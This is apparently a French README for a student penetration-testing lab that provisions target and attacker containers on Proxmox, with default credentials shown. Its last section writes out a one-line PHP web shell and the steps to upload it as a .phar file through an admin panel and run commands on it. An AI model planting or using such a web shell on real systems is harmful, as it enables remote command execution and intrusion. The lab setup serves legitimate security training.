# VIR2
Installation de git

```python
sudp apt install git
```

Clonage du repo

```python
git glone https://github.com/andre1400/VIR2.git
chmod +x **/{AnsibleScriptLAB.yaml, AnsibleScriptPirate.yaml, ScriptPython.py}
```

Installation du module python qu’on aura besoin pour notre script plus tard

```python
pip install absl-py
```

Installation d’Ansbile

```bash
apt update
apt upgrade
apt install python3-pip
python3 -m pip install --user ansible
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source .bashrc
ansible-galaxy collection install community.mysql
```
# Utilisation des contenaires
## Creation
/// INPUT
```
root@pve-01:/vir2/VIR2# python3 ./ScriptPython.py --task create --number 5
```
/// OUTPUT
```
Creation des pentesterlabs
ID : 200 Created
ID : 201 Created
ID : 202 Created
ID : 203 Created
ID : 204 Created
Creation des machines attaquantes
ID : 300 Created
ID : 301 Created
ID : 302 Created
ID : 303 Created
ID : 304 Created
```
## Start
/// INPUT
```
root@pve-01:/vir2/VIR2# python3 ./ScriptPython.py --task start --number 3
```
///OUTPUT
```
==Start des machines pentesterlabs==
ID : 200 IP : 10.10.111.150/24
Username: root Password: Pa$$w0rd
ID : 201 IP : 10.10.111.151/24
Username: root Password: Pa$$w0rd
ID : 202 IP : 10.10.111.152/24
Username: root Password: Pa$$w0rd

==Start des machines attaquantes Let's GO !!!...==
ID : 400 IP : 10.10.111.143/24
Username: root Password: Pa$$w0rd
ID : 401 IP : 10.10.111.153/24
Username: root Password: Pa$$w0rd
ID : 402 IP : 10.10.111.154/24
Username: root Password: Pa$$w0rd
root@pve-01:/vir2/VIR2#
```
## STOP
/// INPUT
```
root@pve-01:/vir2/VIR2# python3 ./ScriptPython.py --task stop --number 3
```
/// OUTPUT
```
==Stop des machines pentesterlabs==
ID : 200 Stopped
ID : 201 Stopped
ID : 202 Stopped

==Stop des machines attaquantes==
ID : 400 Stopped
ID : 401 Stopped
ID : 402 Stopped
```
## SUPPRESSION (STOP + SUPPRESSION)
/// INPUT
```
root@pve-01:/vir2/VIR2# python3 ./ScriptPython.py --task erase --number 3
```
///OUTPUT
```
==Remove des machines pentesterlabs==
  Logical volume "vm-200-disk-0" successfully removed
ID : 200 Removed
  Logical volume "vm-201-disk-0" successfully removed
ID : 201 Removed
  Logical volume "vm-202-disk-0" successfully removed
ID : 202 Removed

==Remove des machine attaquantess==
  Logical volume "vm-400-disk-0" successfully removed
ID : 400 Removed
  Logical volume "vm-401-disk-0" successfully removed
ID : 401 Removed
  Logical volume "vm-402-disk-0" successfully removed
ID : 402 Removed
```
## Lister
*Ca va lister uniquement l'environnement lab de l'étudiant, pour tous lister : pct list*

/// INPUT
```
root@pve:~# python3 ./ScriptPython.py --task list --number 2
```
///OUTPUT
```
Listing all containers :
200 stopped penterlabT
201 stopped penterlabT
300 stopped attackerT
301 stopped attackerT
```
## Exécution d’un script `myshell.php` sur `pentester-03` [3 pts]**
    1. Tester depuis le navigateur de l’étudiant *`http://pentester-03/admin/uploads/myshell.phar?cmd=ls`*
        
        <?php  
           system($_GET['cmd']);
        ?>
```
lynx http://10.10.111.169/
go to > Admin
type : y
Login : admin
Password : P4ssw0rd
go on > add
Title : myshell.PHP
File : myshell.phar
click on > add
CRTL + C to quit lynx
```
```
lynx http://10.10.111.169/admin/uploads/myshell.phar?cmd=ls
```
